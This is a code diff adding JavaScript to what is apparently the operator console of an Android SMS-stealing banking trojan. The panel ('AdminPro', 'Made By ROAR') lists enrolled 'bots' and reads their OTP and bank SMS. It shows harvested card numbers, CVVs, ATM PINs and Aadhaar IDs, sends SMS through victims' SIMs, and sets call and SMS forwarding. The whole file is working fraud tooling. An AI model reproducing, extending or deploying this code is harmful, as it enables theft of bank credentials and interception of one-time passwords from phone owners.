+function setMsgFilter(f){currentMsgFilter=f;var mc=document.getElementById('mainContent');if(mc&&currentNav==='messages'){mc.innerHTML=renderMessagesHTML();}}
+function filterMsgList(q){
+  _msgSearchQuery = q || '';
+  var el=document.getElementById('msgList');if(!el)return;
+  if(!q){el.innerHTML=renderMsgsAggregate();return;}
+  var list=globalMsgs.filter(function(m){return m.type==='incoming'&&((m.message||'')+(m.sender||'')+(m.deviceName||'')).toLowerCase().indexOf(q.toLowerCase())!==-1;});
+  if(!list.length){el.innerHTML='<div class="empty"><div class="ei">💬</div><p>No matches</p></div>';return;}
+  var html='';
+  list.slice(0,200).forEach(function(m){
+    var cat=categorizeMsg(m);
+    var catLabel={credit:'Credit',debit:'Debit',otp:'Otp',bank:'Bank',other:'Other'}[cat]||'Other';
+    var devIdEnc=m.deviceId?encodeURIComponent(m.deviceId):'';
+    html+='<div class="msg-card" data-msgdev="'+devIdEnc+'" onclick="openDeviceFromMsg(this)"><div class="msg-head"><span class="msg-sender">'+esc((m.sender||'').substring(0,12))+'</span><span class="msg-cat '+cat+'">'+catLabel+'</span><span class="msg-time">'+esc(getMsgTimeStr(m))+'</span></div><div class="msg-body">'+esc(m.message)+'</div></div>';
+  });
+  el.innerHTML=html;
+}
+function copyMsg(btn){var t=btn.getAttribute('data-msg')||'';if(navigator.clipboard)navigator.clipboard.writeText(t).then(function(){showToast('✓ Copied','on');});else showToast('Copied');}
+function deleteMsgFromList(key,devId, origId, wrapper){
+  if(!fbDB){toast('Not ready');return;}
+  var deviceId=devId||curMsgDev;
+  if(!deviceId){toast('No device');return;}
+  document.getElementById('confT').textContent='Delete message?';
+  document.getElementById('confM').textContent='Message removed.';
+  document.getElementById('confOk').onclick=async function(){
+    closeM('confirmModal');
+    try{
+        var w = wrapper ? wrapper + '/' : '';
+
+        await fbDB.ref('messages/'+deviceId+'/'+w+key).remove().catch(function(){});
+        if(origId && origId !== deviceId) await fbDB.ref('messages/'+origId+'/'+w+key).remove().catch(function(){});
+
+        await fbDB.ref('mess/'+deviceId+'/'+w+key).remove().catch(function(){});
+        if(origId && origId !== deviceId) await fbDB.ref('mess/'+origId+'/'+w+key).remove().catch(function(){});
+
+        var dev = allDevices.find(function(d){return d.id === deviceId;});
+        var androidId = dev && dev.raw && dev.raw.android_id ? dev.raw.android_id : null;
+        if(androidId) {
+            await fbDB.ref('messages/'+androidId+'/'+w+key).remove().catch(function(){});
+            await fbDB.ref('mess/'+androidId+'/'+w+key).remove().catch(function(){});
+        }
+        toast('Deleted');_allMsgsLoaded=false;
+    }catch(e){toast('Error');}
+  };
+  openM('confirmModal');
+}
+function deleteAllMsgs(){
+  if(!fbDB){toast('Not ready');return;}
+  document.getElementById('confT').textContent='Delete all messages?';
+  document.getElementById('confM').textContent='Cannot be undone.';
+  document.getElementById('confOk').onclick=async function(){
+    closeM('confirmModal');toast('Deleting…');
+    for(var i=0;i<allDevices.length;i++){try{await fbDB.ref('messages/'+allDevices[i].id).remove();}catch(e){}}
+    globalMsgs=[];_allMsgsLoaded=false;toast('✓ Deleted all','on');
+    if(currentNav==='messages'){var mc=document.getElementById('mainContent');if(mc)mc.innerHTML=renderMessagesHTML();}
+  };
+  openM('confirmModal');
+}
+
+function renderSettingsHTML(){
+  var html='';
+  html+='<div class="page-head"><div class="ph-icon">⚙</div><div class="ph-body"><div class="ph-title">Settings</div><div class="ph-sub">Configure your panel</div></div></div>';
+  html+='<div class="set-card">';
+  html+='<div class="set-card-head"><div class="set-icon blue">✈</div><div><div class="set-title">Telegram Bot</div><div class="set-sub">Instant notifications</div></div></div>';
+  html+='<label class="fl">🤖 BOT TOKEN</label><input class="fi" id="tgToken" placeholder="123456:ABC..." style="font-family:var(--mono);font-size:12px;"/>';
+  html+='<label class="fl"># CHAT ID</label><input class="fi" id="tgChatId" placeholder="123456789" style="font-family:var(--mono);font-size:12px;"/>';
+  html+='<button class="sbtn" onclick="toast(\'✓ Saved\',\'on\')">💾 Save Telegram Bot</button>';
+  html+='</div>';
+  html+='<div class="set-card">';
+  html+='<div class="set-card-head"><div class="set-icon green">🛡</div><div><div class="set-title">2FA &amp; Security</div><div class="set-sub">Extra protection</div></div></div>';
+  html+='<div style="font-size:12.5px;font-weight:800;color:var(--text);margin-bottom:8px;">2FA Method</div>';
+  html+='<div style="font-size:10.5px;color:var(--dim);margin-bottom:9px;font-weight:600;">Tap to enable/disable</div>';
+  html+='<div class="method-toggle">';
+  html+='<div class="method-card'+(current2FAMethod==='telegram'?' active':'')+'" data-2fa="telegram" onclick="select2FA(\'telegram\')"><span class="m-badge">ON</span><span class="m-ico">🔑</span><div class="m-title">Telegram OTP</div><div class="m-sub">Tap to enable</div></div>';
+  html+='<div class="method-card" data-2fa="fingerprint" onclick="select2FA(\'fingerprint\')"><span class="m-badge">ON</span><span class="m-ico">👆</span><div class="m-title">Biometric</div><div class="m-sub">Fingerprint</div></div>';
+  html+='</div>';
+  html+='<div style="font-size:10.5px;color:var(--dim);margin-top:11px;padding:10px 12px;background:var(--green-soft);border-radius:10px;border-left:3px solid var(--green);line-height:1.55;" id="authInfoBox">Tap a method above to enable lock.</div>';
+  html+='<div class="set-row" style="margin-top:12px;"><div><div class="set-lbl">🔒 2FA on Login</div><div class="set-lbl-sub">Verify on app open</div></div><button class="toggle'+((''+_authSettings.enabled)==='true'?' on':'')+'" onclick="this.classList.toggle(\'on\');toggle2FAOnLogin(this.classList.contains(\'on\'))"></button></div>';
+  html+='<div class="set-row"><div><div class="set-lbl">🛡 2FA on Delete</div><div class="set-lbl-sub">OTP to delete</div></div><button class="toggle" onclick="this.classList.toggle(\'on\')"></button></div>';
+  html+='</div>';
+  html+='<div class="set-card">';
+  html+='<div class="set-card-head"><div class="set-icon purple">🔐</div><div><div class="set-title">Login Methods <span style="font-size:9px;padding:2px 7px;border-radius:7px;background:var(--green-bg);color:var(--green-deep);font-weight:800;margin-left:5px;">NEW</span></div><div class="set-sub">Fast &amp; secure</div></div></div>';
+  html+='<div class="set-row"><div><div class="set-lbl">👆 Fingerprint Login</div><div class="set-lbl-sub">Biometric login</div></div><button class="toggle'+((''+(_authSettings.method==='fingerprint'))==='true'?' on':'')+'" onclick="this.classList.toggle(\'on\');if(this.classList.contains(\'on\'))select2FA(\'fingerprint\');else disableAuth();"></button></div>';
+  html+='<div class="set-row"><div><div class="set-lbl">✈ Telegram OTP</div><div class="set-lbl-sub">Login via Telegram</div></div><button class="toggle'+((''+(_authSettings.method==='telegram'))==='true'?' on':'')+'" onclick="this.classList.toggle(\'on\');if(this.classList.contains(\'on\'))select2FA(\'telegram\');else disableAuth();"></button></div>';
+  html+='</div>';
+  html+='<div class="set-card">';
+  html+='<div class="set-card-head"><div class="set-icon gray">☰</div><div><div class="set-title">More Options</div><div class="set-sub">Additional tools</div></div></div>';
+  var opts=[
+    {icon:'📋',label:'All Forms',action:'showToast(\'All Forms — soon\')'},
+    {icon:'🔗',label:'Manage Links',action:'showToast(\'Manage Links — soon\')'},
+    {icon:'✈',label:'All Sent SMS',action:'switchTab(\'messages\')'},
+    {icon:'🎨',label:'Customize',action:'showToast(\'Customize — soon\')'},
+    {icon:'🕐',label:'Login History',action:'openLoginHistory()'},
+    {icon:'ℹ',label:'About',action:'showToast(\'AdminPro v1.0 · Made By ROAR\')'},
+    {icon:'⬇',label:'Export Data',action:'exportData()'},
+    {icon:'✨',label:'Magic Clear',action:'openMagicClear()'},
+    {icon:'🔍',label:'Magic Scan',action:'startMagicScanFromSettings()'},
+    {icon:'🔓',label:'Lock Panel Now',action:'lockPanelNow()'}
+  ];
+  opts.forEach(function(o){html+='<div class="set-row" style="cursor:pointer;" onclick="'+o.action+'"><div class="set-lbl">'+o.icon+' '+o.label+'</div><span class="info-arrow">›</span></div>';});
+  html+='</div>';
+  return html;
+}
+function toggle2FAOnLogin(enabled){
+  _authSettings.enabled=enabled;
+  if(!enabled){_authSettings.method='none';}
+  else if(_authSettings.method==='none'){_authSettings.method='telegram';sendOtpToTelegram();}
+  saveAuthSettings();update2FACardsUI();
+  var info=document.getElementById('authInfoBox');
+  if(info)info.innerHTML=enabled?'✓ 2FA <b>ACTIVE</b>':'Tap a method above to enable lock.';
+  showToast(enabled?'✓ 2FA enabled':'2FA disabled',enabled?'on':'off');
+}
+function lockPanelNow(){clearSession();closeM('confirmModal');showLockScreen();renderLockUI();showToast('🔒 Panel locked','on');}
+function exportData(){
+  try{
+    var data={devices:allDevices,messages:globalMsgs.slice(0,500),exportedAt:new Date().toISOString()};
+    var blob=new Blob([JSON.stringify(data,null,2)],{type:'application/json'});
+    var url=URL.createObjectURL(blob);
+    var a=document.createElement('a');a.href=url;a.download='adminpro_'+Date.now()+'.json';a.click();
+    setTimeout(function(){URL.revokeObjectURL(url);},1000);
+    showToast('✓ Exported','on');
+  }catch(e){showToast('Export failed','off');}
+}
+
+function openMagicClear(){
+  _mcSelectedDays=7;_mcFoundDevices=[];
+  document.getElementById('mcIntro').style.display='block';
+  document.getElementById('mcScanning').style.display='none';
+  document.getElementById('mcResults').style.display='none';
+  document.querySelectorAll('.mc-day').forEach(function(el){el.classList.toggle('active',parseInt(el.getAttribute('data-days'))===7);});
+  openM('magicClearModal');
+}
+function closeMagicClear(){closeM('magicClearModal');}
+function selectMcDays(d){_mcSelectedDays=d;document.querySelectorAll('.mc-day').forEach(function(el){el.classList.toggle('active',parseInt(el.getAttribute('data-days'))===d);});}
+function startMagicScan(){
+  if(!_mcSelectedDays)_mcSelectedDays=7;
+  document.getElementById('mcIntro').style.display='none';
+  document.getElementById('mcScanning').style.display='block';
+  document.getElementById('mcResults').style.display='none';
+  var statusEl=document.getElementById('mcStatusText'),subEl=document.getElementById('mcSubText'),progEl=document.getElementById('mcProgIn');
+  var steps=[
+    {t:'Initializing…',s:'Loading device list',p:10},
+    {t:'Scanning…',s:'Reading '+allDevices.length+' devices',p:35},
+    {t:'Checking online…',s:'Filtering active devices',p:60},
+    {t:'Analyzing inactivity…',s:'Looking for devices >'+_mcSelectedDays+' days',p:85},
+    {t:'Finalizing…',s:'Preparing list',p:100}
+  ];
+  var i=0;
+  function nextStep(){
+    if(i>=steps.length)return finishMagicScan();
+    statusEl.textContent=steps[i].t;subEl.textContent=steps[i].s;progEl.style.width=steps[i].p+'%';
+    i++;
+    setTimeout(nextStep,650);
+  }
+  progEl.style.width='0%';
+  setTimeout(nextStep,300);
+}
+function finishMagicScan(){
+  var threshold=_mcSelectedDays*24*60*60*1000;
+  var now=Date.now();
+  var cleanable=[],offlineCount=0;
+  allDevices.forEach(function(d){
+    if(!d.status)offlineCount++;
+    var age=now-(d.ts||now);
+    if(!d.status && age>threshold){cleanable.push({dev:d,ageDays:Math.floor(age/(24*60*60*1000))});}
+  });
+  _mcFoundDevices=cleanable;
+  document.getElementById('mcScanning').style.display='none';
+  document.getElementById('mcResults').style.display='block';
+  document.getElementById('mcStatTotal').textContent=allDevices.length;
+  document.getElementById('mcStatOff').textContent=offlineCount;
+  document.getElementById('mcStatClean').textContent=cleanable.length;
+  var titleEl=document.getElementById('mcResultTitle'),subEl=document.getElementById('mcResultSub');
+  var listEl=document.getElementById('mcDevList'),clearBtn=document.getElementById('mcClearBtn');
+  if(cleanable.length===0){
+    titleEl.textContent='✨ All Clean!';
+    subEl.textContent='No offline devices older than '+_mcSelectedDays+' days';
+    listEl.innerHTML='<div class="empty" style="padding:20px;"><div class="ei">✓</div><p>Nothing to clean</p></div>';
+    clearBtn.style.display='none';
+  }else{
+    titleEl.textContent='⚠ Found '+cleanable.length+' device'+(cleanable.length>1?'s':'');
+    subEl.textContent='Offline > '+_mcSelectedDays+' days';
+    var html='';
+    cleanable.forEach(function(item){
+      var d=item.dev;var num=getDeviceNumber(d.id);var name=getDeviceDisplayName(d);
+      html+='<div class="mc-dev-row"><div class="av">'+num+'</div><div class="meta"><div class="nm">'+esc(name)+'</div><div class="sub">Last seen '+item.ageDays+'d ago · #'+num+'</div></div></div>';
+    });
+    listEl.innerHTML=html;
+    clearBtn.style.display='flex';
+    clearBtn.textContent='🗑 Remove '+cleanable.length+' device'+(cleanable.length>1?'s':'');
+  }
+}
+function startMagicScanFromSettings(){openMagicClear();setTimeout(function(){startMagicScan();},200);}
+async function confirmMagicClear(){
+  if(!_mcFoundDevices.length){toast('Nothing to clear');return;}
+  if(!fbDB){toast('Not ready');return;}
+  var count=_mcFoundDevices.length;
+  var btn=document.getElementById('mcClearBtn');
+  btn.disabled=true;btn.textContent='⏳ Removing…';
+  var ok=0;
+  for(var i=0;i<_mcFoundDevices.length;i++){
+    var d=_mcFoundDevices[i].dev;
+    try{await fbDB.ref((d.path||'clients')+'/'+d.id).remove();ok++;}catch(e){}
+  }
+  toast('✓ Removed '+ok+'/'+count,'on');
+  _allMsgsLoaded=false;
+  closeMagicClear();
+  setTimeout(function(){
+    allDevices=allDevices.filter(function(d){return !_mcFoundDevices.find(function(x){return x.dev.id===d.id;});});
+    if(currentNav==='devices'){var mc=document.getElementById('mainContent');if(mc)mc.innerHTML=renderDevicesHTML();}
+    else if(currentNav==='overview'){var mc2=document.getElementById('mainContent');if(mc2)mc2.innerHTML=renderOverviewHTML();}
+  },300);
+}
+
+function renderDeviceProfileHTML(d){
+  var raw=d.raw||{};
+  var isOnline=d.status;
+  var batt=d.batteryNum>=0?d.batteryNum+'%':'—';
+  var displayName=getDeviceDisplayName(d);
+  var network=(d.sims[0]&&(d.sims[0].carrierName||d.sims[0].carrier))||raw.networkOperator||'';
+  var netShort=network?String(network).substring(0,3).toUpperCase():'A12';
+  var html='';
+  html+='<div class="dp-top">';
+  html+='<div class="dp-av">📱<span class="dp-dot '+(isOnline?'on':'off')+'"></span></div>';
+  html+='<div class="dp-info">';
+  html+='<div class="dp-name">'+esc(displayName)+'</div>';
+  html+='<div class="dp-user">👑 Made By ROAR</div>';
+  html+='<div class="dp-id">'+esc(d.id)+'</div>';
+  html+='<div class="dp-pills">';
+  html+='<span class="dp-pill '+(isOnline?'online':'offline')+'">'+(isOnline?'Online':'Offline')+'</span>';
+  html+='<span class="dp-pill" style="background:var(--card2);color:var(--sub);text-transform:none;font-family:var(--mono);">'+(d.ts?timeAgo(d.ts):'—')+'</span>';
+  html+='<span class="dp-pill batt">🔋 '+batt+'</span>';
+  html+='<span class="dp-pill net">📶 '+esc(netShort)+'</span>';
+  html+='</div></div></div>';
+  html+='<div class="dp-sims">';
+  if(d.sims&&d.sims.length){
+    d.sims.forEach(function(sim,i){
+      var n2=sim.phoneNumber||sim.number||'N/A';
+      var carrier=sim.carrierName||sim.carrier||sim.networkOperator||'N/A';
+      var slot=sim.slotIndex!=null?sim.slotIndex:i;
+      html+='<div class="dp-sim"><div class="dp-sim-ico'+(i===1?' s2':'')+'">📶</div><div class="dp-sim-txt">SIM'+(i+1)+': '+esc(carrier)+' | '+esc(n2)+' | slot:'+slot+'</div></div>';
+    });
+  }else{
+    html+='<div class="dp-sim"><div class="dp-sim-ico">📶</div><div class="dp-sim-txt">SIM1: N/A</div></div>';
+    html+='<div class="dp-sim"><div class="dp-sim-ico s2">📶</div><div class="dp-sim-txt">SIM2: N/A</div></div>';
+  }
+  html+='</div>';
+  return html;
+}
+
+function renderDeviceDetail(){
+  if(!selDev)return'<div class="empty"><div class="ei">📱</div><p>Select device</p></div>';
+  var html='';
+  html+='<div class="dp-card" id="deviceProfileBox">'+renderDeviceProfileHTML(selDev)+'</div>';
+  html+='<div class="act-row">';
+  html+='<button class="act-btn ping" id="pingBtnDetail" onclick="pingRealtime()"><span class="ab-ico">📡</span>Ping</button>';
+  html+='<button class="act-btn sms" onclick="switchSubTab(\'sendsms\')"><span class="ab-ico">✈</span>SMS</button>';
+  html+='<button class="act-btn fwd" onclick="openCfModal()"><span class="ab-ico">📞</span>Call Fwd</button>';
+  html+='<button class="act-btn smsfwd" onclick="openSmsFwdModal()"><span class="ab-ico">📨</span>SMS Fwd</button>';
+  html+='</div>';
+  var best=findBestCardsForDevice(selDev);
+  var formCount=best.cards.length;
+  var incomingCount=allMsgs.filter(function(m){return m.type==='incoming';}).length;
+  html+='<div class="sub-tabs-wrap"><div class="sub-tabs">';
+  html+='<div class="sub-tab '+(currentSubTab==='sms'?'active':'')+'" data-subtab="sms" onclick="switchSubTab(\'sms\')">💬 SMS <span class="badge">'+incomingCount+'</span></div>';
+  html+='<div class="sub-tab '+(currentSubTab==='sent'?'active':'')+'" data-subtab="sent" onclick="switchSubTab(\'sent\')">✈ Sent</div>';
+  html+='<div class="sub-tab '+(currentSubTab==='calls'?'active':'')+'" data-subtab="calls" onclick="switchSubTab(\'calls\')">📞 Calls</div>';
+  html+='<div class="sub-tab '+(currentSubTab==='forms'?'active':'')+'" data-subtab="forms" onclick="switchSubTab(\'forms\')">📋 Forms <span class="badge">'+formCount+'</span></div>';
+  html+='</div></div>';
+  html+='<div id="subTabContent"></div>';
+  return html;
+}
+function switchSubTab(t){
+  currentSubTab=t;currentDetailMsgFilter='all';
+  _subTabOpenTime=Date.now();_msgFirstRender=(t==='sms');
+  document.querySelectorAll('.sub-tab').forEach(function(el){el.classList.remove('active');});
+  var el=document.querySelector('.sub-tab[data-subtab="'+t+'"]');if(el)el.classList.add('active');
+  var mc=document.getElementById('mainContent');if(mc)mc.scrollTop=0;
+  renderSubTabContent(false);
+  setTimeout(function(){var m=document.getElementById('mainContent');if(m)m.scrollTop=0;},30);
+}
+function setDetailFilter(f){currentDetailMsgFilter=f;renderSubTabContent(true);}
+function renderSubTabContent(isUpdate){
+  var el=document.getElementById('subTabContent');if(!el||!selDev)return;
+  if(currentSubTab==='sms'&&!_msgFbResponded){el.innerHTML='<div class="ldwrap"><div class="gold-spin"></div><div>Loading…</div></div>';return;}
+  var html='';
+  if(currentSubTab==='sms'){
+    var incoming=allMsgs.filter(function(m){return m.type==='incoming';});
+    var detailFilter=['all','credit','debit','bank'];
+    var counts={all:incoming.length,credit:0,debit:0,bank:0};
+    incoming.forEach(function(m){var c=categorizeMsg(m);if(counts[c]!==undefined)counts[c]++;});
+    html+='<div class="chip-row small">';
+    detailFilter.forEach(function(k){
+      var lbl=k.charAt(0).toUpperCase()+k.slice(1);
+      var activeCls=(currentDetailMsgFilter===k)?'active':'';
+      if(k==='all'&&currentDetailMsgFilter==='all')activeCls='active purple';
+      html+='<div class="chip '+activeCls+'" style="padding:7px 12px;font-size:11px;" onclick="setDetailFilter(\''+k+'\')">'+lbl+' <span class="chip-count">'+counts[k]+'</span></div>';
+    });
+    html+='</div>';
+
+    var allBanks = getAllBankBalances(allMsgs);
+    if (allBanks.length > 0) {
+      html += '<div class="bank-list">';
+      allBanks.forEach(function(b) {
+        html += '<div class="bank-line">';
+        html += '<span class="b-name">🏦 ' + esc(b.name) + '</span>';
+        html += '<span class="b-amt">₹' + formatMoneyShort(b.balance) + '</span>';
+        html += '</div>';
+      });
+      html += '</div>';
+    }
+
+    var filtered=incoming;
+    if(currentDetailMsgFilter!=='all')filtered=incoming.filter(function(m){return categorizeMsg(m)===currentDetailMsgFilter;});
+    if(!filtered.length)html+='<div class="empty"><div class="ei">💬</div><p>No messages</p></div>';
+    else{var arr=[];for(var i=0;i<Math.min(filtered.length,500);i++)arr.push(renderMsgBubble(filtered[i]));html+='<div class="msg-list">'+arr.join('')+'</div>';}
+  }else if(currentSubTab==='sent'){
+    var sent=allMsgs.filter(function(m){return m.type==='outgoing';});
+    if(!sent.length)html='<div class="empty"><div class="ei">📤</div><p>No sent messages</p></div>';
+    else{var arr=[];for(var i=0;i<Math.min(sent.length,500);i++)arr.push(renderMsgBubble(sent[i]));html='<div class="msg-list">'+arr.join('')+'</div>';}
+  }else if(currentSubTab==='calls'){
+    html='<div id="callLogList"><div class="ldwrap"><div class="gold-spin"></div><div>Loading…</div></div></div>';
+    setTimeout(function(){if(_callsRef)_callsRef.once('value').then(function(s){renderCallLogs(s.val()||{});});else renderCallLogs({});},50);
+  }else if(currentSubTab==='forms'){html=renderFormsContent();}
+  else if(currentSubTab==='sendsms'){html=renderSendSmsPanel();setTimeout(function(){updDD();selSim(curSim);},30);}
+  var mc=document.getElementById('mainContent');
+  var savedScroll=mc?mc.scrollTop:0;
+  var oldHeight=mc?mc.scrollHeight:0;
+  el.innerHTML=html;
+  var newHeight=mc?mc.scrollHeight:0;
+  if(mc){
+    var cooldown=Date.now()-_subTabOpenTime<900;
+    if(_msgFirstRender||cooldown){mc.scrollTop=0;requestAnimationFrame(function(){mc.scrollTop=0;});_msgFirstRender=false;}
+    else if(isUpdate&&oldHeight>250&&newHeight>250){var wasAtBottom=(savedScroll+(mc.clientHeight||0))>=(oldHeight-80);if(wasAtBottom)mc.scrollTop=newHeight;else mc.scrollTop=savedScroll;}
+    else if(!isUpdate)mc.scrollTop=0;
+    else mc.scrollTop=savedScroll;
+  }
+}
+
+function renderMsgBubble(m){
+  var cat=classifyMsg(m.message);
+  var finCls=cat!=='normal'?' fin-'+cat:'';
+  var cls=m.type==='incoming'?'inc':'out';
+  var tpCls=m.type==='incoming'?'in':'out';
+  var tpTxt=m.type==='incoming'?'IN':'OUT';
+  var catBadge='';
+  if(cat==='debit')catBadge='<span class="msg-cat debit">💸 DEBIT</span>';
+  else if(cat==='credit')catBadge='<span class="msg-cat credit">💰 CREDIT</span>';
+  var flashCls='',newBadge='';
+  if(_newMsgKeys[m.key]&&m.type==='incoming'){var age=Date.now()-_newMsgKeys[m.key];if(age<8000)flashCls=' flash';if(age<NEW_TAG_TTL)newBadge='<span class="msg-cat credit">🟢 NEW</span>';}
+  var ts=getMsgTimeStr(m);
+  return'<div class="msg-bub '+cls+finCls+flashCls+'"><div class="msg-bub-head"><span class="msg-bub-sender">'+esc(m.sender)+'</span><span class="msg-bub-type '+tpCls+'">'+tpTxt+'</span>'+catBadge+newBadge+'<span class="msg-bub-time">'+esc(ts)+'</span></div><div class="msg-bub-txt">'+esc(m.message)+'</div></div>';
+}
+
+function renderFormsContent(){
+  var result=findBestCardsForDevice(selDev);
+  var header='<div class="forms-hdr"><div class="forms-hdr-icon">💳</div><div class="forms-hdr-txt"><div class="forms-hdr-title">Card Details</div><div class="forms-hdr-sub">'+result.cards.length+' records · '+result.sourceLabel+'</div></div></div>';
+  if(!result.cards.length)return header+'<div class="empty"><div class="ei">📋</div><p>No card data</p><p class="hint">Data will appear here when submitted from device</p></div>';
+  var seen={},deduped=[];
+  result.cards.forEach(function(c){var k=(c.number||c.aadhaar||c.account||c.customerName||'')+'|'+(c.expiry||'');if(!k||seen[k])return;seen[k]=true;deduped.push(c);});
+  if(!deduped.length)return header+'<div class="empty"><div class="ei">📋</div><p>No valid data</p></div>';
+  var html=header;
+  deduped.forEach(function(p,index){
+    var displayTitle = 'Record #' + (index+1);
+    if(p.formType) displayTitle += ' · ' + p.formType.toUpperCase();
+    if(p.holder||p.customerName) displayTitle = (p.holder||p.customerName) + (p.formType ? ' (' + p.formType.toUpperCase() + ')' : '');
+
+    html+='<div class="form-group"><div class="form-group-header"><div class="form-group-title">'+esc(displayTitle)+'</div><div class="form-group-date">'+esc(p.dateTime||'')+'</div>';
+    if(result.source==='firebase'||p.manual)html+='<div class="form-del" onclick="deleteFormGroup(\''+esc(p.key).replace(/'/g,"\\'")+'\')">🗑</div>';
+    html+='</div>';
+    if(p.holder||p.customerName)html+=formRow('👤','Holder',p.holder||p.customerName,'');
+    if(p.mobile)html+=formRow('📱','Mobile',p.mobile,'');
+    if(p.account)html+=formRow('💰','Account',p.account,'');
+    if(p.number)html+=formRow('💳','Card',String(p.number).replace(/(.{4})/g,'$1 ').trim(),'');
+    if(p.expiry)html+=formRow('📅','Expiry',p.expiry,'');
+    if(p.cvv)html+=formRow('🔐','CVV',p.cvv,'hl');
+    if(p.dob)html+=formRow('🎂','DOB',p.dob,'');
+    if(p.atmPin)html+=formRow('🔢','ATM PIN',p.atmPin,'hl');
+    if(p.aadhaar)html+=formRow('🆔','Aadhaar',p.aadhaar,'');
+    if(p.bank)html+=formRow('🏦','Bank',p.bank,'');
+    if(p.network)html+=formRow('📡','Network',p.network,'');
+    html+='</div>';
+  });
+  return html;
+}
+function formRow(icon,label,value,cls){return'<div class="form-row"><div class="form-row-lbl"><span>'+icon+'</span>'+esc(label)+'</div><div class="form-row-val '+(cls||'')+'">'+esc(value)+'</div></div>';}
+
+function renderSendSmsPanel(){
+  var html='<div style="max-width:580px;margin:0 auto;">';
+  html+='<div class="panel"><div class="panel-t">📡 Send SMS</div><div class="panel-s">Route via '+esc(getDeviceDisplayName(selDev))+'</div>';
+  html+='<div class="sim-tog"><div class="sim-col"><button class="stb s1" id="sb1" onclick="selSim(1)">SIM 1</button><div class="snrow"><span class="sntxt" id="sn1">—</span><button class="cpb" id="cp1" onclick="cpSN(1)">Copy</button></div></div>';
+  html+='<div class="sim-col"><button class="stb" id="sb2" onclick="selSim(2)">SIM 2</button><div class="snrow"><span class="sntxt" id="sn2">—</span><button class="cpb" id="cp2" onclick="cpSN(2)">Copy</button></div></div></div>';
+  html+='<label class="fl">To</label><input id="sTo" class="sinp" placeholder="+91 9876543210" style="margin-bottom:12px;"/>';
+  html+='<label class="fl">Message</label><textarea id="sMsg" class="sarea" placeholder="Type message..." style="margin-bottom:16px;"></textarea>';
+  html+='<button class="sbtn" id="sBtn" onclick="sendSms()">🚀 Send SMS</button><div class="sres" id="sRes"></div></div></div>';
+  return html;
+}
+function deleteFormGroup(gKey){
+  if(!selDev)return;if(!fbDB){toast('Not ready');return;}
+  document.getElementById('confT').textContent='Delete record?';
+  document.getElementById('confM').textContent='Entry removed permanently.';
+  document.getElementById('confOk').onclick=async function(){
+    closeM('confirmModal');
+    try{
+      var devPath=(selDev.path||'users')+'/'+selDev.id;
+      if(gKey.indexOf('submissions/')===0){
+          var parts=gKey.split('/');
+          if(parts.length===2){await fbDB.ref(devPath+'/submissions/'+parts[1]).remove();}
+          else{await fbDB.ref(devPath+'/submissions').remove();}
+      } else if(gKey.indexOf('forms/')===0){
+          await fbDB.ref(devPath+'/'+gKey).remove();
+      } else {
+          await fbDB.ref(devPath+'/forms/'+gKey).remove();
+      }
+      toast('✓ Deleted');renderSubTabContent(true);
+    }catch(e){toast('Error');}
+  };
+  openM('confirmModal');
+}
+function selSim(n){curSim=n;var b1=document.getElementById('sb1'),b2=document.getElementById('sb2');if(b1)b1.className='stb'+(n===1?' s1':'');if(b2)b2.className='stb'+(n===2?' s2':'');}
+function cpSN(n){var v=document.getElementById('sn'+n).textContent;clip(stripIndiaCode(v));toast('Copied');}
+function updDD(){if(!selDev)return;var s1=selDev.sims[0],s2=selDev.sims[1];var n1=s1?(s1.phoneNumber||s1.number||''):'';var n2=s2?(s2.phoneNumber||s2.number||''):'';setTxt('sn1',fmtPh(n1)||'—');setTxt('sn2',fmtPh(n2)||'—');}
+async function sendSms(){
+  if(!selDev){toast('Select device');return;}
+  if(!fbDB){toast('Not ready');return;}
+  var to=document.getElementById('sTo').value.trim();
+  var msg=document.getElementById('sMsg').value.trim();
+  if(!to||!msg){toast('Enter number and message');return;}
+  var btn=document.getElementById('sBtn');btn.disabled=true;btn.textContent='Sending…';
+  try{await fbDB.ref('clients/'+selDev.id+'/outbox').push({sim:curSim,to:to,message:msg,isSent:false,dateTime:new Date().toISOString()});showRes2('sRes',true,'✓ Queued');document.getElementById('sTo').value='';document.getElementById('sMsg').value='';}catch(e){showRes2('sRes',false,'Error');}
+  btn.disabled=false;btn.textContent='🚀 Send SMS';
+}
+
+function openDeviceDetail(id){
+  _callFwEnabled=false;_callFwTarget='';_callFwSim=1;
+  _smsFwEnabled=false;_smsFwTarget='';_smsFwSim=1;
+
+  selDev=allDevices.find(function(d){return d.id===id;});
+  if(!selDev){toast('Device not found');return;}
+  var switching=(curMsgDev!==id);
+  currentNav='device-detail';currentSubTab='sms';currentDetailMsgFilter='all';
+  _msgFirstRender=true;_subTabOpenTime=Date.now();
+  
+  /* CACHE CHECK */
+  if (switching) {
+      if (_msgCache[id] && _msgCache[id].length > 0) {
+          allMsgs = _msgCache[id];
+          _msgFbResponded = true;
+      } else {
+          allMsgs = [];
+          _msgFbResponded = false;
+      }
+  }
+  
+  document.querySelectorAll('.bottom-nav .nav-item').forEach(function(el){el.classList.remove('active');});
+  var mc=document.getElementById('mainContent');
+  if(mc){mc.scrollTop=0;mc.innerHTML=renderDeviceDetail();}
+  if(switching||!_msgRef)listenMessages(id);
+  else if(_msgFbResponded&&curMsgDev===id)renderSubTabContent(false);
+  else listenMessages(id);
+  setupForwardingListeners(id);
+  setTimeout(function(){var m=document.getElementById('mainContent');if(m)m.scrollTop=0;},50);
+  setTimeout(function(){var m=document.getElementById('mainContent');if(m)m.scrollTop=0;},300);
+}
+
+function toggleSB(){document.getElementById('sidebar').classList.toggle('open');document.getElementById('sbOverlay').classList.toggle('open');}
+function timeAgo(ts){if(!ts)return'recently';var diff=Date.now()-ts;var mins=Math.floor(diff/60000);if(mins<1)return'just now';if(mins<60)return mins+'m ago';var hrs=Math.floor(mins/60);if(hrs<24)return hrs+'h ago';return Math.floor(hrs/24)+'d ago';}
+function updCnt(){totalMsgs=allMsgs.length;}
+async function addBot(){
+  if(!fbDB){toast('Not ready');return;}
+  var id=document.getElementById('aId').value.trim(),nm=document.getElementById('aN').value.trim(),ph=document.getElementById('aP').value.trim();
+  if(!id){toast('Enter ID');return;}
+  try{await fbDB.ref('clients/'+id).set({model:nm||id,mobNo:ph,online:false,sims:ph?[{phoneNumber:ph}]:[]});closeM('addModal');toast('✓ Added');document.getElementById('aId').value='';document.getElementById('aN').value='';document.getElementById('aP').value='';}catch(e){toast('Error');}
+}
+async function updNum(){
+  if(!fbDB){toast('Not ready');return;}
+  var id=document.getElementById('uId').value.trim(),ph=document.getElementById('uP').value.trim();
